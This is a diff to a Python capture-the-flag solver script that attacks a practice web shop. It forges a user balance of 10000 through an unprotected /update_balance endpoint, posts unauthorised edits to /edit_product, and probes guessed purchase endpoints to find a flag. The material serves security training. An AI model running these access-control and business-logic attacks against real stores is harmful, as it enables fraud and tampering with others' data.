@@ -325,9 +325,125 @@ class CTFSolver:
         }
     
     def make_purchase(self, shop_response):
-        """Attempt to make a purchase"""
+        """Attempt to make a purchase using multiple strategies"""
         print("[+] Looking for purchase functionality...")
         
+        # Extract user ID from profile link (discovered in shop analysis)
+        user_id_match = re.search(r'/profile/(\d+)', shop_response['content'])
+        user_id = user_id_match.group(1) if user_id_match else '2'  # Default to 2 based on analysis
+        print(f"[+] Detected user ID: {user_id}")
+        
+        # Strategy 1: Try to update balance using internal endpoint
+        print("[+] Strategy 1: Attempting to update balance using internal endpoint...")
+        balance_url = f"{self.base_url}/update_balance/{user_id}"
+        balance_data = {'balance': '10000'}  # Set high balance to afford any item
+        
+        balance_response = self.make_request(balance_url, balance_data, 'POST')
+        if balance_response and balance_response['status'] == 200:
+            print("[+] Balance update successful!")
+            
+            # Check for flag in balance update response
+            flag = self.find_flag(balance_response['content'])
+            if flag:
+                print(f"[!] FLAG FOUND AFTER BALANCE UPDATE: {flag}")
+                return flag
+            
+            # Now try to purchase the cheapest item (Headphones - $199.99, product ID 3)
+            print("[+] Attempting to add cheapest item to cart...")
+            cart_response = self.make_request(f"{self.base_url}/add_to_cart/3")  # Headphones
+            
+            if cart_response and cart_response['status'] == 200:
+                print("[+] Item added to cart successfully!")
+                
+                # Check for flag in cart response
+                flag = self.find_flag(cart_response['content'])
+                if flag:
+                    print(f"[!] FLAG FOUND AFTER ADDING TO CART: {flag}")
+                    return flag
+        else:
+            print("[-] Balance update failed or not allowed")
+        
+        # Strategy 2: Try direct purchase with "Add to Cart" links
+        print("[+] Strategy 2: Trying direct 'Add to Cart' approaches...")
+        
+        # Try adding each product to cart (discovered products 1-4)
+        for product_id in range(1, 5):
+            print(f"[+] Trying to add product {product_id} to cart...")
+            cart_response = self.make_request(f"{self.base_url}/add_to_cart/{product_id}")
+            
+            if cart_response and cart_response['status'] == 200:
+                print(f"[+] Product {product_id} added to cart!")
+                flag = self.find_flag(cart_response['content'])
+                if flag:
+                    print(f"[!] FLAG FOUND AFTER ADDING PRODUCT {product_id}: {flag}")
+                    return flag
+            else:
+                print(f"[-] Failed to add product {product_id} to cart")
+        
+        # Strategy 3: Try to access cart and complete purchase
+        print("[+] Strategy 3: Accessing cart to complete purchase...")
+        cart_page_response = self.make_request(f"{self.base_url}/cart")
+        
+        if cart_page_response and cart_page_response['status'] == 200:
+            print("[+] Cart page accessed successfully!")
+            flag = self.find_flag(cart_page_response['content'])
+            if flag:
+                print(f"[!] FLAG FOUND IN CART PAGE: {flag}")
+                return flag
+            
+            # Look for checkout/purchase forms in cart
+            cart_forms = self.parse_forms(cart_page_response['content'])
+            for form in cart_forms:
+                if any(keyword in form['action'].lower() for keyword in ['checkout', 'purchase', 'buy', 'order']):
+                    print(f"[+] Found checkout form: {form['action']}")
+                    
+                    # Prepare form data
+                    form_data = {}
+                    for inp in form['inputs']:
+                        if inp['type'] == 'hidden':
+                            form_data[inp['name']] = inp['value']
+                        elif inp['type'] != 'submit':
+                            form_data[inp['name']] = inp.get('value', '')
+                    
+                    # Submit checkout form
+                    checkout_url = form['action']
+                    if not checkout_url.startswith('http'):
+                        checkout_url = f"{self.base_url}{checkout_url}"
+                    
+                    checkout_response = self.make_request(checkout_url, form_data, form['method'])
+                    if checkout_response and checkout_response['status'] == 200:
+                        flag = self.find_flag(checkout_response['content'])
+                        if flag:
+                            print(f"[!] FLAG FOUND AFTER CHECKOUT: {flag}")
+                            return flag
+        
+        # Strategy 4: Try common purchase endpoints
+        print("[+] Strategy 4: Trying common purchase endpoints...")
+        purchase_endpoints = ['/buy', '/purchase', '/order', '/checkout', '/cart/checkout']
+        for endpoint in purchase_endpoints:
+            print(f"[+] Trying endpoint: {endpoint}")
+            response = self.make_request(f"{self.base_url}{endpoint}")
+            if response and response['status'] == 200:
+                flag = self.find_flag(response['content'])
+                if flag:
+                    print(f"[!] FLAG FOUND AT {endpoint}: {flag}")
+                    return flag
+        
+        # Strategy 5: Try the internal product edit endpoint (might trigger something)
+        print("[+] Strategy 5: Trying internal product edit endpoint...")
+        for product_id in range(1, 5):
+            edit_url = f"{self.base_url}/edit_product/{product_id}"
+            edit_data = {'description': 'flag_trigger'}
+            
+            edit_response = self.make_request(edit_url, edit_data, 'POST')
+            if edit_response and edit_response['status'] == 200:
+                flag = self.find_flag(edit_response['content'])
+                if flag:
+                    print(f"[!] FLAG FOUND AFTER EDITING PRODUCT {product_id}: {flag}")
+                    return flag
+        
+        # Strategy 6: Look for purchase forms in shop page
+        print("[+] Strategy 6: Looking for purchase forms in shop page...")
         forms = self.parse_forms(shop_response['content'])
         
         # Look for buy/purchase forms
@@ -340,26 +456,6 @@ class CTFSolver:
         if not purchase_forms:
             # Try any POST forms as potential purchase forms
             purchase_forms = [f for f in forms if f['method'] == 'POST']
-        
-        if not purchase_forms:
-            print("[-] No purchase forms found")
-            # Try common purchase endpoints
-            common_endpoints = ['/buy', '/purchase', '/order', '/cart/add']
-            for endpoint in common_endpoints:
-                print(f"[+] Trying endpoint: {endpoint}")
-                url = f"{self.base_url}{endpoint}"
-                response = self.make_request(url, {}, 'POST')
-                
-                flag = self.find_flag(response['content'])
-                if flag:
-                    print(f"[!] FLAG FOUND: {flag}")
-                    return flag
-                    
-                if response['status'] == 200:
-                    print(f"[+] {endpoint} responded successfully")
-                    print(f"[+] Response preview: {response['content'][:200]}...")
-            
-            return None
         
         # Try each purchase form
         for i, form in enumerate(purchase_forms):
@@ -463,5 +559,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
